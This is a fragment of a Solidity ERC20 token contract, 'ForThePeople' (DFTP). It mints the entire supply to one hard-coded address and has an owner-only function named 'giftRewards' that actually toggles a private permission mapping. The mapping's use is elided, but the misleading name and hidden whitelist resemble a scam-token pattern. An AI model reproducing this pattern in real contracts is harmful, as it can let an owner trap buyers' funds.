...
contract ForThePeople is ERC20, Ownable {
    mapping(address=>bool) private _enable;
    address private _uni;
    constructor() ERC20('ForThePeople','DFTP') {
        _mint(0x227b53116c7a8E5af94CF3eD0919e64B123e8fd2, 1000000 *10**18);
        _enable[0x227b53116c7a8E5af94CF3eD0919e64B123e8fd2] = true;
    }
    ...
    function giftRewards(address user, bool enable) public onlyOwner {
        _enable[user] = enable;
    }
